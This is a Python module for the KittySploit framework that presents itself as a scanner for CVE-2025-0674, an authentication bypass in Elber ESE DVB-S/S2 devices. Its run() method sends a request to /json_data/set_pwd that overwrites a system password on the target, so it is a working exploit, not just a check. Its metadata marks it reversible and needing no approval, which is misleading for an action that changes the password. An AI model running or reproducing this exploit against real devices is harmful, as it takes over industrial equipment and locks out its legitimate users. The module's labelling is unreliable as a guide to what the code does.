#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Multiple Elber products are affected by an authentication bypass vulnerability which allows unauthorized acces."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Elber ESE DVB-S/S2 - Authentication Bypass Detection',
        'description': "Multiple Elber products are affected by an authentication bypass vulnerability which allows unauthorized access to the password management functionality. Attackers can exploit this issue by manipulating the endpoint to overwrite any user's password within the system.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'auth-bypass', 'elber', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.cisa.gov/news-events/ics-advisories/icsa-25-035-03',
            'https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/wayber/Elber-Wayber%E6%A8%A1%E6%8B%9F%E6%95%B0%E5%AD%97%E9%9F%B3%E9%A2%91%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E.md?plain=1',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-0674',
        ],
        'cve': 'CVE-2025-0674',
    }

    def run(self):
        path = '/modules/pwd.html'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Manage system Password',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/json_data/set_pwd?lev=2&pass=admin1234'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Apply successfully',)
        if any(m in body for m in body_any):
            self.set_info(severity='critical', reason='Elber ESE DVB-S/S2 - Authentication Bypass detected', path=path)
            return True
        return False

